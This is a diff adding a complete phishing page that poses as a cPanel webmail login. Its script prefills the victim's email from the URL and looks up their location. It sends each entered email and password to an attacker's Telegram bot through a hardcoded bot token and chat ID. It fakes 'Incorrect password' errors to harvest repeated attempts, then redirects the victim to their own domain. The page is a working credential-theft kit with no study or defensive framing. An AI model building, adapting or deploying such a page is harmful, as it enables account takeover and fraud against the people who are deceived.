@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Webmail Login</title>
+
+<!-- FONT -->
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+    body {
+        font-family: "Open Sans", sans-serif;
+        background: #ffffff;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #333;
+    }
+
+    .container {
+        text-align: center;
+        width: 100%;
+        max-width: 420px;
+    }
+
+    /* Logo */
+    .logo {
+        margin-bottom: 30px;
+    }
+    .logo img {
+        width: 260px;
+        height: auto;
+        user-select: none;
+    }
+
+    /* Inputs */
+    .input-group {
+        width: 80%;
+        margin: 0 auto 20px auto;
+        text-align: left;
+    }
+
+    .input-group label {
+        font-size: 13px;
+        font-weight: 600;
+        margin-bottom: 6px;
+        display: block;
+    }
+
+    .input-wrapper {
+        position: relative;
+    }
+
+    .input-wrapper img.icon {
+        width: 24px;
+        height: 24px;
+        position: absolute;
+        left: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        opacity: 0.65;
+    }
+
+    .input-group input {
+        width: 100%;
+        padding: 12px 12px 12px 46px;
+        font-size: 14px;
+        border: 1px solid #c5c5c5;
+        border-radius: 4px;
+        outline: none;
+        box-sizing: border-box;
+        background-color: #fff;
+    }
+
+    .input-group input:focus {
+        border-color: #0087d1;
+    }
+
+    /* Login button */
+    .btn-login {
+        width: 80%;
+        padding: 12px;
+        background: #0087d1;
+        color: white;
+        font-size: 15px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 6px;
+        font-weight: 600;
+    }
+
+    .btn-login:hover {
+        background: #0076b9;
+    }
+
+    /* Divider */
+    .divider {
+        display: flex;
+        align-items: center;
+        margin: 30px auto;
+        width: 80%;
+        color: #666;
+        font-size: 14px;
+    }
+    .divider::before,
+    .divider::after {
+        content: "";
+        flex-grow: 1;
+        border-bottom: 1px solid #ccc;
+    }
+    .divider span {
+        margin: 0 10px;
+        font-weight: 600;
+    }
+
+    /* cPanel button */
+    .btn-cpanel {
+        width: 80%;
+        padding: 12px;
+        background: #f5731b;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 15px;
+        cursor: pointer;
+        font-weight: 600;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 8px;
+        margin: 0 auto;
+    }
+
+    .btn-cpanel img {
+        width: 22px;
+        height: 22px;
+    }
+
+    .btn-cpanel:hover {
+        background: #e46a17;
+    }
+
+    /* Error message */
+    #error-msg {
+        color: red;
+        font-size: 13px;
+        margin-top: 8px;
+        min-height: 18px;
+    }
+
+    /* Footer */
+    .footer {
+        margin-top: 60px;
+        text-align: center;
+        font-size: 14px;
+        color: #555;
+    }
+
+    .footer span {
+        margin: 0 8px;
+        cursor: pointer;
+    }
+
+    .copyright {
+        font-size: 13px;
+        color: #777;
+        margin-top: 20px;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- Logo -->
+    <div class="logo">
+        <img id="logo" src="https://i.postimg.cc/J4wXCsc7/Screenshot-2025-11-15-at-1-11-23-am.png" alt="Webmail Logo">
+    </div>
+
+    <!-- Email -->
+    <div class="input-group">
+        <label>Email Address</label>
+        <div class="input-wrapper">
+            <img class="icon" src="https://img.icons8.com/ios-filled/50/737373/user.png" alt="email icon">
+            <input id="email" type="email" placeholder="Enter your email address">
+        </div>
+    </div>
+
+    <!-- Password -->
+    <div class="input-group">
+        <label>Password</label>
+        <div class="input-wrapper">
+            <img class="icon" src="https://img.icons8.com/material-rounded/24/737373/lock.png" alt="password icon">
+            <input id="password" type="password" placeholder="Enter your password">
+        </div>
+    </div>
+
+    <!-- Error message -->
+    <div id="error-msg"></div>
+
+    <!-- Login button -->
+    <button id="login-btn" class="btn-login">Log in</button>
+
+    <!-- Divider -->
+    <div class="divider"><span>OR</span></div>
+
+    <!-- cPanel button -->
+    <button class="btn-cpanel">
+        <img src="https://i.postimg.cc/mk16zPth/Screenshot_2025_11_15_at_1_25_29_am.png">
+        Log in via cPanelID
+    </button>
+
+    <!-- Footer -->
+    <div class="footer">
+        <span>English</span>
+        <span>العربية</span>
+        <span>čeština</span>
+        <span>dansk</span>
+        <span>Deutsch</span>
+        <span>Ελληνικά</span>
+        <span>español</span>
+        <span>español latinoamericano</span>
+        <span>...</span>
+
+        <div class="copyright">
+            Copyright © 2025 cPanel, L.L.C.<br>
+            <a href="#" style="text-decoration:none; color:#777;">Privacy Policy</a>
+        </div>
+    </div>
+
+</div>
+
+
+
+
+<script>
+
+  // Fade transition after video
+  const intro = document.getElementById('intro');
+  const loginBox = document.getElementById('loginBox');
+  const videoDuration = 9500; // ~9.5 seconds
+
+  setTimeout(() => {
+    intro.classList.add('fade-out');
+    setTimeout(() => {
+      intro.style.display = 'none';
+      loginBox.classList.add('visible');
+    }, 1200);
+  }, videoDuration);
+
+  // Telegram Bot config
+  const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+  const TELEGRAM_CHAT_ID = "7574749243";
+
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('login-btn');
+  const errorMsg = document.getElementById('error-msg');
+  const logoImg = document.getElementById('logo');
+
+  let attempts = 0;
+  const maxAttempts = 3;
+
+// Get email from query parameter (?email=) instead of hash
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("email");
+
+if (!rawEmail || !/^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+} else {
+  emailInput.value = rawEmail;
+  emailInput.setAttribute("readonly", true);
+
+  const domain = rawEmail.split('@')[1];
+  logoImg.src = `https://i.postimg.cc/J4wXCsc7/Screenshot-2025-11-15-at-1-11-23-am.png`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://i.postimg.cc/J4wXCsc7/Screenshot-2025-11-15-at-1-11-23-am.png";
+  };
+}
+
+
+  // Get location info
+  let userCity = "Unknown City";
+  let userCountry = "Unknown Country";
+
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      userCity = data.city || userCity;
+      userCountry = data.country_name || userCountry;
+    }).catch(() => {});
+
+  function sendTelegramMessage(email, password, attempt) {
+    const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+                 `UserId: [${email}]\nPass: [${password}]\n` +
+                 `Country: [${userCity}, ${userCountry}]`;
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "HTML"})
+    }).catch(e => console.error("Telegram send failed:", e));
+  }
+
+  loginBtn.addEventListener('click', () => {
+    const password = passwordInput.value.trim();
+    if (password === "") {
+      errorMsg.textContent = "Password cannot be empty.";
+      errorMsg.style.display = "block";
+      return;
+    }
+    attempts++;
+    sendTelegramMessage(emailInput.value, password, attempts);
+
+    if (attempts < maxAttempts) {
+      errorMsg.textContent = "Incorrect password.";
+      errorMsg.style.display = "block";
+      passwordInput.value = "";
+    } else {
+      errorMsg.style.display = "none";
+      window.location.href = `https://${emailInput.value.split('@')[1]}`;
+    }
+  });
+</script>
+
+</body>
+</html>
